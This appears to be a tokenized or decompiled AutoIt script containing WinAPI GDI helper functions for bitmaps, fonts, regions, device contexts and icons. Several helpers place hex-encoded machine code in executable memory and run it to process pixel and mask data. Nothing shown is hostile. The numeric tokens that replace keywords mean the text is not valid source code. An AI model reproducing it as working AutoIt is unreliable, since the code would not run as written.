69($TBITMAPINFO,"biSizeImage",0)
69($TBITMAPINFO,"biXPelsPerMeter",0)
69($TBITMAPINFO,"biYPelsPerMeter",0)
69($TBITMAPINFO,"biClrUsed",$ICOLORS)
69($TBITMAPINFO,"biClrImportant",0)
4$ICOLORS5
4223($TCOLORTABLE)5
_WINAPI_MOVEMEMORY(67($TBITMAPINFO,"aRGBQuad"),$TCOLORTABLE,4*$ICOLORS)
6
_WINAPI_ZEROMEMORY(67($TBITMAPINFO,"aRGBQuad"),4*$ICOLORS)
8
8
28$HBITMAP=_WINAPI_CREATEDIBSECTION(0,$TBITMAPINFO,0,$__G_VEXT)
43$HBITMAP534287(@ERROR,@EXTENDED,0)
34$HBITMAP
33
32_WINAPI_CREATEDIBSECTION($HDC,$TBITMAPINFO,$IUSAGE,36$PBITS,$HSECTION=0,$IOFFSET=0)
$PBITS=0
28$ARET=58("gdi32.dll","handle","CreateDIBSection","handle",$HDC,"struct*",$TBITMAPINFO,"uint",$IUSAGE,"ptr*",0,"handle",$HSECTION,"dword",$IOFFSET)
4@ERROR23$ARET[0]534287(@ERROR,@EXTENDED,0)
$PBITS=$ARET[4]
34$ARET[0]
33
32_WINAPI_CREATEDIBCOLORTABLE(3036$ACOLORTABLE,$ISTART=0,$IEND=-1)
4__CHECKERRORARRAYBOUNDS($ACOLORTABLE,$ISTART,$IEND)534287(@ERROR+10,@EXTENDED,0)
28$TCOLORTABLE=65("dword["&($IEND-$ISTART+1)&"]")
28$ICOUNT=1
13$I=$ISTART15$IEND
69($TCOLORTABLE,1,_WINAPI_SWITCHCOLOR(__RGB($ACOLORTABLE[$I])),$ICOUNT)
$ICOUNT+=1
14
34$TCOLORTABLE
33
32_WINAPI_CREATEFONT($IHEIGHT,$IWIDTH,$IESCAPE=0,$IORIENTN=0,$IWEIGHT=$__WINAPICONSTANT_FW_NORMAL,$BITALIC=40,$BUNDERLINE=40,$BSTRIKEOUT=40,$ICHARSET=$__WINAPICONSTANT_DEFAULT_CHARSET,$IOUTPUTPREC=$__WINAPICONSTANT_OUT_DEFAULT_PRECIS,$ICLIPPREC=$__WINAPICONSTANT_CLIP_DEFAULT_PRECIS,$IQUALITY=$__WINAPICONSTANT_DEFAULT_QUALITY,$IPITCH=0,$SFACE="Arial")
28$ARESULT=58("gdi32.dll","handle","CreateFontW","int",$IHEIGHT,"int",$IWIDTH,"int",$IESCAPE,"int",$IORIENTN,"int",$IWEIGHT,"dword",$BITALIC,"dword",$BUNDERLINE,"dword",$BSTRIKEOUT,"dword",$ICHARSET,"dword",$IOUTPUTPREC,"dword",$ICLIPPREC,"dword",$IQUALITY,"dword",$IPITCH,"wstr",$SFACE)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_CREATEFONTINDIRECT($TLOGFONT)
28$ARESULT=58("gdi32.dll","handle","CreateFontIndirectW","struct*",$TLOGFONT)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_CREATERECTRGN($ILEFTRECT,$ITOPRECT,$IRIGHTRECT,$IBOTTOMRECT)
28$ARESULT=58("gdi32.dll","handle","CreateRectRgn","int",$ILEFTRECT,"int",$ITOPRECT,"int",$IRIGHTRECT,"int",$IBOTTOMRECT)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_CREATEROUNDRECTRGN($ILEFTRECT,$ITOPRECT,$IRIGHTRECT,$IBOTTOMRECT,$IWIDTHELLIPSE,$IHEIGHTELLIPSE)
28$ARESULT=58("gdi32.dll","handle","CreateRoundRectRgn","int",$ILEFTRECT,"int",$ITOPRECT,"int",$IRIGHTRECT,"int",$IBOTTOMRECT,"int",$IWIDTHELLIPSE,"int",$IHEIGHTELLIPSE)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_CREATESOLIDBRUSH($ICOLOR)
28$ARESULT=58("gdi32.dll","handle","CreateSolidBrush","INT",$ICOLOR)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_GETBITMAPDIMENSION($HBITMAP)
28$TOBJ=65($TAGBITMAP)
28$ARET=58("gdi32.dll","int","GetObject","handle",$HBITMAP,"int",68($TOBJ),"struct*",$TOBJ)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34_WINAPI_CREATESIZE(66($TOBJ,"bmWidth"),66($TOBJ,"bmHeight"))
33
32_WINAPI_GETSYSCOLORBRUSH($IINDEX)
28$ARESULT=58("user32.dll","handle","GetSysColorBrush","int",$IINDEX)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_GETTEXTEXTENTPOINT32($HDC,$STEXT)
28$TSIZE=65($TAGSIZE)
28$ISIZE=323($STEXT)
28$ARET=58("gdi32.dll","bool","GetTextExtentPoint32W","handle",$HDC,"wstr",$STEXT,"int",$ISIZE,"struct*",$TSIZE)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34$TSIZE
33
32_WINAPI_GETTEXTMETRICS($HDC)
28$TTEXTMETRIC=65($TAGTEXTMETRIC)
28$ARET=58("gdi32.dll","bool","GetTextMetricsW","handle",$HDC,"struct*",$TTEXTMETRIC)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34$TTEXTMETRIC
33
32_WINAPI_GETWINDOWRGN($HWND,$HRGN)
28$ARESULT=58("user32.dll","int","GetWindowRgn","hwnd",$HWND,"handle",$HRGN)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_ISALPHABITMAP($HBITMAP)
$HBITMAP=_WINAPI_COPYBITMAP($HBITMAP)
43$HBITMAP534287(@ERROR+20,@EXTENDED,0)
28$ARET,$IERROR=0
11
28$TDIB=65($TAGDIBSECTION)
4(3_WINAPI_GETOBJECT($HBITMAP,68($TDIB),$TDIB))2(66($TDIB,"bmBitsPixel")<>32)2(66($TDIB,"biCompression"))5
$IERROR=1
18
8
$ARET=58("user32.dll","int","CallWindowProc","ptr",__ALPHAPROC(),"ptr",0,"uint",0,"struct*",$TDIB,"ptr",0)
4@ERROR2($ARET[0]=-1)5
$IERROR=@ERROR+10
18
8
121
_WINAPI_DELETEOBJECT($HBITMAP)
4$IERROR534287($IERROR,0,0)
34$ARET[0]
33
32_WINAPI_PTINRECT(36$TRECT,36$TPOINT)
28$ARESULT=58("user32.dll","bool","PtInRect","struct*",$TRECT,"struct",$TPOINT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_REDRAWWINDOW($HWND,$TRECT=0,$HREGION=0,$IFLAGS=5)
28$ARESULT=58("user32.dll","bool","RedrawWindow","hwnd",$HWND,"struct*",$TRECT,"handle",$HREGION,"uint",$IFLAGS)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_SETWINDOWRGN($HWND,$HRGN,$BREDRAW=39)
28$ARESULT=58("user32.dll","int","SetWindowRgn","hwnd",$HWND,"handle",$HRGN,"bool",$BREDRAW)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32__ALPHAPROC()
31$PPROC=0
43$PPROC5
4@AUTOITX645
$PPROC=__INIT(13("0x48894C240848895424104C894424184C894C24205541574831C050504883EC28"&"48837C24600074054831C0EB0748C7C0010000004821C0751F488B6C24604883"&"7D180074054831C0EB0748C7C0010000004821C07502EB0948C7C001000000EB"&"034831C04821C0740C48C7C0FFFFFFFF4863C0EB6F48C744242800000000488B"&"6C24604C637D04488B6C2460486345084C0FAFF849C1E7024983C7FC4C3B7C24"&"287C36488B6C24604C8B7D184C037C24284983C7034C897C2430488B6C243080"&"7D0000740C48C7C0010000004863C0EB1348834424280471A54831C04863C0EB"&"034831C04883C438415F5DC3"))
6
$PPROC=__INIT(13("0x555331C05050837C241C00740431C0EB05B80100000021C075198B6C241C837D"&"1400740431C0EB05B80100000021C07502EB07B801000000EB0231C021C07407"&"B8FFFFFFFFEB4FC70424000000008B6C241C8B5D048B6C241C0FAF5D08C1E302"&"83C3FC3B1C247C288B6C241C8B5D14031C2483C303895C24048B6C2404807D00"&"007407B801000000EB0C8304240471BE31C0EB0231C083C4085B5DC21000"))
8
8
34$PPROC
33
32__ANDPROC()
31$PPROC=0
43$PPROC5
4@AUTOITX645
$PPROC=__INIT(13("0x48894C240848895424104C894424184C894C2420554157415648C7C009000000"&"4883EC0848C704240000000048FFC875EF4883EC284883BC24A0000000007405"&"4831C0EB0748C7C0010000004821C00F85840000004883BC24A8000000007405"&"4831C0EB0748C7C0010000004821C07555488BAC24A000000048837D18007405"&"4831C0EB0748C7C0010000004821C07522488BAC24A800000048837D18007405"&"4831C0EB0748C7C0010000004821C07502EB0948C7C001000000EB034831C048"&"21C07502EB0948C7C001000000EB034831C04821C07502EB0948C7C001000000"&"EB034831C04821C0740B4831C04863C0E9D701000048C74424280000000048C7"&"44243000000000488BAC24A00000004C637D0849FFCF4C3B7C24300F8C9C0100"&"0048C74424380000000048C74424400000000048C744244800000000488BAC24"&"A00000004C637D0449FFCF4C3B7C24480F8CDB000000488BAC24A00000004C8B"&"7D184C037C24284983C7034C897C2450488B6C2450807D000074264C8B7C2440"&"4C8B74243849F7DE4983C61F4C89F148C7C00100000048D3E04909C74C897C24"&"4048FF4424384C8B7C24384983FF1F7E6F4C8B7C244049F7D74C897C244048C7"&"442458180000004831C0483B4424587F3D488BAC24A80000004C8B7D184C037C"&"24604C897C24504C8B7C2440488B4C245849D3FF4C89F850488B6C2458588845"&"0048FF4424604883442458F871B948C74424380000000048C744244000000000"&"48834424280448FF4424480F810BFFFFFF48837C24380074794C8B7C244049F7"&"D74C8B74243849F7DE4983C6204C89F148C7C0FFFFFFFF48D3E04921C74C897C"&"244048C7442458180000004831C0483B4424587F3D488BAC24A80000004C8B7D"&"184C037C24604C897C24504C8B7C2440488B4C245849D3FF4C89F850488B6C24"&"585888450048FF4424604883442458F871B948FF4424300F814AFEFFFF48C7C0"&"010000004863C0EB034831C04883C470415E415F5DC3"))
6
$PPROC=__INIT(13("0x555357BA0800000083EC04C70424000000004A75F3837C243800740431C0EB05"&"B80100000021C07562837C243C00740431C0EB05B80100000021C0753F8B6C24"&"38837D1400740431C0EB05B80100000021C075198B6C243C837D1400740431C0"&"EB05B80100000021C07502EB07B801000000EB0231C021C07502EB07B8010000"&"00EB0231C021C07502EB07B801000000EB0231C021C0740731C0E969010000C7"&"042400000000C7442404000000008B6C24388B5D084B3B5C24040F8C3F010000"&"C744240800000000C744240C00000000C7442410000000008B6C24388B5D044B"&"3B5C24100F8CA90000008B6C24388B5D14031C2483C303895C24148B6C241480"&"7D0000741C8B5C240C8B7C2408F7DF83C71F89F9B801000000D3E009C3895C24"&"0CFF4424088B5C240883FB1F7E578B5C240CF7D3895C240CC744241818000000"&"31C03B4424187F2D8B6C243C8B5D14035C241C895C24148B5C240C8B4C2418D3"&"FB538B6C241858884500FF44241C83442418F871CBC744240800000000C74424"&"0C0000000083042404FF4424100F8145FFFFFF837C240800745B8B5C240CF7D3"&"8B7C2408F7DF83C72089F9B8FFFFFFFFD3E021C3895C240CC744241818000000"&"31C03B4424187F2D8B6C243C8B5D14035C241C895C24148B5C240C8B4C2418D3"&"FB538B6C241858884500FF44241C83442418F871CBFF4424040F81AFFEFFFFB8"&"01000000EB0231C083C4205F5B5DC21000"))
8
8
34$PPROC
33
32__XORPROC()
31$PPROC=0
43$PPROC5
4@AUTOITX645
$PPROC=__INIT(13("0x48894C240848895424104C894424184C894C24205541574831C050504883EC28"&"48837C24600074054831C0EB0748C7C0010000004821C0751B48837C24680074"&"054831C0EB0748C7C0010000004821C07502EB0948C7C001000000EB034831C0"&"4821C074084831C04863C0EB7748C7442428000000004C637C24584983C7FC4C"&"3B7C24287C4F4C8B7C24604C037C24284C897C2430488B6C2430807D00007405"&"4831C0EB0748C7C0010000004821C0741C4C8B7C24684C037C24284983C7034C"&"897C2430488B6C2430C64500FF48834424280471A148C7C0010000004863C0EB"&"034831C04883C438415F5DC3"))
6
$PPROC=__INIT(13("0x555331C05050837C241C00740431C0EB05B80100000021C07516837C24200074"&"0431C0EB05B80100000021C07502EB07B801000000EB0231C021C0740431C0EB"&"5AC70424000000008B5C241883C3FC3B1C247C3E8B5C241C031C24895C24048B"&"6C2404807D0000740431C0EB05B80100000021C074168B5C2420031C2483C303"&"895C24048B6C2404C64500FF8304240471B6B801000000EB0231C083C4085B5D"&"C21000"))
8
8
34$PPROC
33
32__INIT($DDATA)
28$ILENGTH=14($DDATA)
28$ARET=58("kernel32.dll","ptr","VirtualAlloc","ptr",0,"ulong_ptr",$ILENGTH,"dword",4096,"dword",64)
4@ERROR23$ARET[0]5__FATALEXIT(1,"Error allocating memory.")
28$TDATA=65("byte["&$ILENGTH&"]",$ARET[0])
69($TDATA,1,$DDATA)
34$ARET[0]
33
2930$DI_MASK=1
2930$DI_IMAGE=2
2930$DI_NORMAL=3
2930$DI_COMPAT=4
2930$DI_DEFAULTSIZE=8
2930$DI_NOMIRROR=16
2930$DISPLAY_DEVICE_ATTACHED_TO_DESKTOP=1
2930$DISPLAY_DEVICE_MULTI_DRIVER=2
2930$DISPLAY_DEVICE_PRIMARY_DEVICE=4
2930$DISPLAY_DEVICE_MIRRORING_DRIVER=8
2930$DISPLAY_DEVICE_VGA_COMPATIBLE=16
2930$DISPLAY_DEVICE_REMOVABLE=32
2930$DISPLAY_DEVICE_DISCONNECT=33554432
2930$DISPLAY_DEVICE_REMOTE=67108864
2930$DISPLAY_DEVICE_MODESPRUNED=134217728
32_WINAPI_CREATECOMPATIBLEDC($HDC)
28$ARESULT=58("gdi32.dll","handle","CreateCompatibleDC","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_DELETEDC($HDC)
28$ARESULT=58("gdi32.dll","bool","DeleteDC","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_DRAWEDGE($HDC,$TRECT,$IEDGETYPE,$IFLAGS)
28$ARESULT=58("user32.dll","bool","DrawEdge","handle",$HDC,"struct*",$TRECT,"uint",$IEDGETYPE,"uint",$IFLAGS)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_DRAWFRAMECONTROL($HDC,$TRECT,$ITYPE,$ISTATE)
28$ARESULT=58("user32.dll","bool","DrawFrameControl","handle",$HDC,"struct*",$TRECT,"uint",$ITYPE,"uint",$ISTATE)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_DRAWICON($HDC,$IX,$IY,$HICON)
28$ARESULT=58("user32.dll","bool","DrawIcon","handle",$HDC,"int",$IX,"int",$IY,"handle",$HICON)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_DRAWICONEX($HDC,$IX,$IY,$HICON,$IWIDTH=0,$IHEIGHT=0,$ISTEP=0,$HBRUSH=0,$IFLAGS=3)
28$IOPTIONS
23$IFLAGS
211
$IOPTIONS=$DI_MASK
212
$IOPTIONS=$DI_IMAGE
213
$IOPTIONS=$DI_NORMAL
214
$IOPTIONS=$DI_COMPAT
215
$IOPTIONS=$DI_DEFAULTSIZE
216
$IOPTIONS=$DI_NOMIRROR
24
28$ARESULT=58("user32.dll","bool","DrawIconEx","handle",$HDC,"int",$IX,"int",$IY,"handle",$HICON,"int",$IWIDTH,"int",$IHEIGHT,"uint",$ISTEP,"handle",$HBRUSH,"uint",$IOPTIONS)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_DRAWTEXT($HDC,$STEXT,36$TRECT,$IFLAGS)
28$ARESULT=58("user32.dll","int","DrawTextW","handle",$HDC,"wstr",$STEXT,"int",-1,"struct*",$TRECT,"uint",$IFLAGS)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_ENUMDISPLAYDEVICES($SDEVICE,$IDEVNUM)
28$TNAME=0,$IFLAGS=0,$ADEVICE[5]
4$SDEVICE<>""5
$TNAME=65("wchar Text["&323($SDEVICE)+1&"]")
69($TNAME,"Text",$SDEVICE)
8
2830$TAGDISPLAY_DEVICE="dword Size;wchar Name[32];wchar String[128];dword Flags;wchar ID[128];wchar Key[128]"
28$TDEVICE=65($TAGDISPLAY_DEVICE)
28$IDEVICE=68($TDEVICE)
69($TDEVICE,"Size",$IDEVICE)
28$ARET=58("user32.dll","bool","EnumDisplayDevicesW","struct*",$TNAME,"dword",$IDEVNUM,"struct*",$TDEVICE,"dword",1)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
28$IN=66($TDEVICE,"Flags")
417($IN,$DISPLAY_DEVICE_ATTACHED_TO_DESKTOP)<>05$IFLAGS=19($IFLAGS,1)
417($IN,$DISPLAY_DEVICE_PRIMARY_DEVICE)<>05$IFLAGS=19($IFLAGS,2)
417($IN,$DISPLAY_DEVICE_MIRRORING_DRIVER)<>05$IFLAGS=19($IFLAGS,4)
417($IN,$DISPLAY_DEVICE_VGA_COMPATIBLE)<>05$IFLAGS=19($IFLAGS,8)
417($IN,$DISPLAY_DEVICE_REMOVABLE)<>05$IFLAGS=19($IFLAGS,16)
417($IN,$DISPLAY_DEVICE_MODESPRUNED)<>05$IFLAGS=19($IFLAGS,32)
$ADEVICE[0]=39
$ADEVICE[1]=66($TDEVICE,"Name")
$ADEVICE[2]=66($TDEVICE,"String")
$ADEVICE[3]=$IFLAGS
$ADEVICE[4]=66($TDEVICE,"ID")
34$ADEVICE
33
32_WINAPI_FILLRECT($HDC,$TRECT,$HBRUSH)
28$ARESULT
4232($HBRUSH)5
$ARESULT=58("user32.dll","int","FillRect","handle",$HDC,"struct*",$TRECT,"handle",$HBRUSH)
6
$ARESULT=58("user32.dll","int","FillRect","handle",$HDC,"struct*",$TRECT,"dword_ptr",$HBRUSH)
8
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_FRAMERECT($HDC,$TRECT,$HBRUSH)
28$ARESULT=58("user32.dll","int","FrameRect","handle",$HDC,"struct*",$TRECT,"handle",$HBRUSH)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_GETBKMODE($HDC)
28$ARESULT=58("gdi32.dll","int","GetBkMode","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_GETDC($HWND)
28$ARESULT=58("user32.dll","handle","GetDC","hwnd",$HWND)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_GETDCEX($HWND,$HRGN,$IFLAGS)
28$ARET=58("user32.dll","handle","GetDCEx","hwnd",$HWND,"handle",$HRGN,"dword",$IFLAGS)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_GETDEVICECAPS($HDC,$IINDEX)
28$ARESULT=58("gdi32.dll","int","GetDeviceCaps","handle",$HDC,"int",$IINDEX)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_GETTEXTCOLOR($HDC)
28$ARET=58("gdi32.dll","dword","GetTextColor","handle",$HDC)
4@ERROR2($ARET[0]=4294967295)534287(@ERROR,@EXTENDED,-1)
34__RGB($ARET[0])
33
32_WINAPI_GETWINDOWDC($HWND)
28$ARESULT=58("user32.dll","handle","GetWindowDC","hwnd",$HWND)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_PRINTWINDOW($HWND,$HDC,$BCLIENT=40)
28$ARET=58("user32.dll","bool","PrintWindow","hwnd",$HWND,"handle",$HDC,"uint",$BCLIENT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_RELEASEDC($HWND,$HDC)
28$ARESULT=58("user32.dll","int","ReleaseDC","hwnd",$HWND,"handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_RESTOREDC($HDC,$IID)
28$ARET=58("gdi32.dll","bool","RestoreDC","handle",$HDC,"int",$IID)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_SAVEDC($HDC)
28$ARET=58("gdi32.dll","int","SaveDC","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_SETBKCOLOR($HDC,$ICOLOR)
28$ARESULT=58("gdi32.dll","INT","SetBkColor","handle",$HDC,"INT",$ICOLOR)
4@ERROR534287(@ERROR,@EXTENDED,-1)
34$ARESULT[0]
33
32_WINAPI_SETBKMODE($HDC,$IBKMODE)
28$ARESULT=58("gdi32.dll","int","SetBkMode","handle",$HDC,"int",$IBKMODE)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_SETTEXTCOLOR($HDC,$ICOLOR)
28$ARESULT=58("gdi32.dll","INT","SetTextColor","handle",$HDC,"INT",$ICOLOR)
4@ERROR534287(@ERROR,@EXTENDED,-1)
34$ARESULT[0]
33
32_WINAPI_TWIPSPERPIXELX()
28$HDC,$ITWIPSPERPIXELX
$HDC=_WINAPI_GETDC(0)
2830$__WINAPICONSTANT_LOGPIXELSX=88
$ITWIPSPERPIXELX=1440/_WINAPI_GETDEVICECAPS($HDC,$__WINAPICONSTANT_LOGPIXELSX)
_WINAPI_RELEASEDC(0,$HDC)
34$ITWIPSPERPIXELX
33
32_WINAPI_TWIPSPERPIXELY()
28$HDC,$ITWIPSPERPIXELY
$HDC=_WINAPI_GETDC(0)
2830$__WINAPICONSTANT_LOGPIXELSY=90
$ITWIPSPERPIXELY=1440/_WINAPI_GETDEVICECAPS($HDC,$__WINAPICONSTANT_LOGPIXELSY)
_WINAPI_RELEASEDC(0,$HDC)
34$ITWIPSPERPIXELY
33
2930$TAGICONINFO="bool Icon;dword XHotSpot;dword YHotSpot;handle hMask;handle hColor"
32_WINAPI_ADDICONTRANSPARENCY($HICON,$IPERCENT=50,$BDELETE=40)
28$TBITMAP,$HDIB=0,$HRESULT=0
28$AHBITMAP[2]
28$TICONINFO=65($TAGICONINFO)
28$ARET=58("user32.dll","bool","GetIconInfo","handle",$HICON,"struct*",$TICONINFO)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
13$I=0151
$AHBITMAP[$I]=66($TICONINFO,$I+4)
14
28$IERROR=0
11
$HDIB=_WINAPI_COPYBITMAP($AHBITMAP[1])
43$HDIB5
$IERROR=20
18
8
$TBITMAP=65($TAGBITMAP)
4(3_WINAPI_GETOBJECT($HDIB,68($TBITMAP),$TBITMAP))2(66($TBITMAP,"bmBitsPixel")<>32)5
$IERROR=21
18
8
$ARET=58("user32.dll","lresult","CallWindowProc","PTR",__TRANSPARENCYPROC(),"hwnd",0,"uint",$IPERCENT,"wparam",67($TBITMAP),"lparam",0)
4@ERROR23$ARET[0]5
$IERROR=@ERROR+30
18
8
4$ARET[0]=-15
$HRESULT=_WINAPI_CREATEEMPTYICON(66($TBITMAP,"bmWidth"),66($TBITMAP,"bmHeight"))
6
$HRESULT=_WINAPI_CREATEICONINDIRECT($HDIB,$AHBITMAP[0])
8
43$HRESULT5$IERROR=22
121
4$HDIB5
_WINAPI_DELETEOBJECT($HDIB)
8
13$I=0151
4$AHBITMAP[$I]5
_WINAPI_DELETEOBJECT($AHBITMAP[$I])
8
14
4$IERROR534287($IERROR,0,0)
4$BDELETE5
_WINAPI_DESTROYICON($HICON)
8
34$HRESULT
33
32_WINAPI_COPYICON($HICON)
28$ARESULT=58("user32.dll","handle","CopyIcon","handle",$HICON)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_CREATE32BITHICON($HICON,$BDELETE=40)
28$AHBITMAP[2],$HRESULT=0
28$ADIB[2][2]=[[0,0],[0,0]]
28$TICONINFO=65($TAGICONINFO)
28$ARET=58("user32.dll","bool","GetIconInfo","handle",$HICON,"struct*",$TICONINFO)
4@ERROR534287(@ERROR,@EXTENDED,0)
43$ARET[0]534287(10,0,0)
13$I=0151
$AHBITMAP[$I]=66($TICONINFO,$I+4)
14
4_WINAPI_ISALPHABITMAP($AHBITMAP[1])5
$ADIB[0][0]=_WINAPI_CREATEANDBITMAP($AHBITMAP[1])
43@ERROR5
$HRESULT=_WINAPI_CREATEICONINDIRECT($AHBITMAP[1],$ADIB[0][0])
8
6
28$TSIZE=_WINAPI_GETBITMAPDIMENSION($AHBITMAP[1])
28$ASIZE[2]
13$I=0151
$ASIZE[$I]=66($TSIZE,$I+1)
14
28$HSRCDC=_WINAPI_CREATECOMPATIBLEDC(0)
28$HDSTDC=_WINAPI_CREATECOMPATIBLEDC(0)
28$HSRCSV,$HDSTSV
13$I=0151
$ADIB[$I][0]=_WINAPI_CREATEDIB($ASIZE[0],$ASIZE[1])
$ADIB[$I][1]=$__G_VEXT
$HSRCSV=_WINAPI_SELECTOBJECT($HSRCDC,$AHBITMAP[$I])
$HDSTSV=_WINAPI_SELECTOBJECT($HDSTDC,$ADIB[$I][0])
_WINAPI_BITBLT($HDSTDC,0,0,$ASIZE[0],$ASIZE[1],$HSRCDC,0,0,12583114)
_WINAPI_SELECTOBJECT($HSRCDC,$HSRCSV)
_WINAPI_SELECTOBJECT($HDSTDC,$HDSTSV)
14
_WINAPI_DELETEDC($HSRCDC)
_WINAPI_DELETEDC($HDSTDC)
$ARET=58("user32.dll","lresult","CallWindowProc","ptr",__XORPROC(),"ptr",0,"uint",$ASIZE[0]*$ASIZE[1]*4,"wparam",$ADIB[0][1],"lparam",$ADIB[1][1])
43@ERROR1$ARET[0]5
$HRESULT=_WINAPI_CREATEICONINDIRECT($ADIB[1][0],$AHBITMAP[0])
8
8
13$I=0151
_WINAPI_DELETEOBJECT($AHBITMAP[$I])
4$ADIB[$I][0]5
_WINAPI_DELETEOBJECT($ADIB[$I][0])
8
14
43$HRESULT534287(11,0,0)
4$BDELETE5
_WINAPI_DESTROYICON($HICON)
8
34$HRESULT
33
32_WINAPI_CREATEEMPTYICON($IWIDTH,$IHEIGHT,$IBITSPERPEL=32)
28$HXOR=_WINAPI_CREATEDIB($IWIDTH,$IHEIGHT,$IBITSPERPEL)
28$HAND=_WINAPI_CREATEDIB($IWIDTH,$IHEIGHT,1)
28$HDC=_WINAPI_CREATECOMPATIBLEDC(0)
28$HSV=_WINAPI_SELECTOBJECT($HDC,$HAND)
28$HBRUSH=_WINAPI_CREATESOLIDBRUSH(16777215)
28$TRECT=_WINAPI_CREATERECT(0,0,$IWIDTH,$IHEIGHT)
_WINAPI_FILLRECT($HDC,$TRECT,$HBRUSH)
_WINAPI_DELETEOBJECT($HBRUSH)
_WINAPI_SELECTOBJECT($HDC,$HSV)
_WINAPI_DELETEDC($HDC)
28$HICON=_WINAPI_CREATEICONINDIRECT($HXOR,$HAND)
28$IERROR=@ERROR
4$HXOR5
_WINAPI_DELETEOBJECT($HXOR)
8
4$HAND5
_WINAPI_DELETEOBJECT($HAND)
8
43$HICON534287($IERROR+10,0,0)
34$HICON
33
32_WINAPI_CREATEICON($HINSTANCE,$IWIDTH,$IHEIGHT,$IPLANES,$IBITSPIXEL,$PANDBITS,$PXORBITS)
28$ARET=58("user32.dll","handle","CreateIcon","handle",$HINSTANCE,"int",$IWIDTH,"int",$IHEIGHT,"byte",$IPLANES,"byte",$IBITSPIXEL,"struct*",$PANDBITS,"struct*",$PXORBITS)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_CREATEICONFROMRESOURCEEX($PDATA,$ISIZE,$BICON=39,$IXDESIREDPIXELS=0,$IYDESIREDPIXELS=0,$IFLAGS=0)
28$ARET=58("user32.dll","handle","CreateIconFromResourceEx","ptr",$PDATA,"dword",$ISIZE,"bool",$BICON,"dword",196608,"int",$IXDESIREDPIXELS,"int",$IYDESIREDPIXELS,"uint",$IFLAGS)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_CREATEICONINDIRECT($HBITMAP,$HMASK,$IXHOTSPOT=0,$IYHOTSPOT=0,$BICON=39)
28$TICONINFO=65($TAGICONINFO)
69($TICONINFO,1,$BICON)
69($TICONINFO,2,$IXHOTSPOT)
69($TICONINFO,3,$IYHOTSPOT)
69($TICONINFO,4,$HMASK)
69($TICONINFO,5,$HBITMAP)
28$ARET=58("user32.dll","handle","CreateIconIndirect","struct*",$TICONINFO)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_DESTROYICON($HICON)
28$ARESULT=58("user32.dll","bool","DestroyIcon","handle",$HICON)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_EXTRACTICON($SICON,$IINDEX,$BSMALL=40)
28$PLARGE,$PSMALL,$TPTR=65("ptr")
4$BSMALL5
$PLARGE=0
$PSMALL=67($TPTR)
6
$PLARGE=67($TPTR)
$PSMALL=0
8
58("shell32.dll","uint","ExtractIconExW","wstr",$SICON,"int",$IINDEX,"ptr",$PLARGE,"ptr",$PSMALL,"uint",1)
4@ERROR534287(@ERROR,@EXTENDED,0)
3466($TPTR,1)
33
32_WINAPI_EXTRACTICONEX($SFILEPATH,$IINDEX,$PALARGE,$PASMALL,$IICONS)
28$ARESULT=58("shell32.dll","uint","ExtractIconExW","wstr",$SFILEPATH,"int",$IINDEX,"struct*",$PALARGE,"struct*",$PASMALL,"uint",$IICONS)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
